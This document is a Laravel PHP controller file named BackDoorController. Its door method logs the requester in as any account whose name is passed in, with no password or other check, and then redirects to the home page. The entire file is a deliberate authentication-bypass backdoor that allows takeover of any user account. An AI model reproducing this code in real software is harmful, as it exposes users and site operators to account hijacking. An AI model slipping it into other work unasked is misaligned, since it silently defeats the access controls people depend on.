<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller as Controller;
use App\Models\AccountModel;
use Illuminate\Http\Request;

class BackDoorController extends Controller
{
    public function door($account)
    {
        \Auth::loginUsingId(AccountModel::where('account', $account)->value('id'));

        return redirect('/');
    }
}
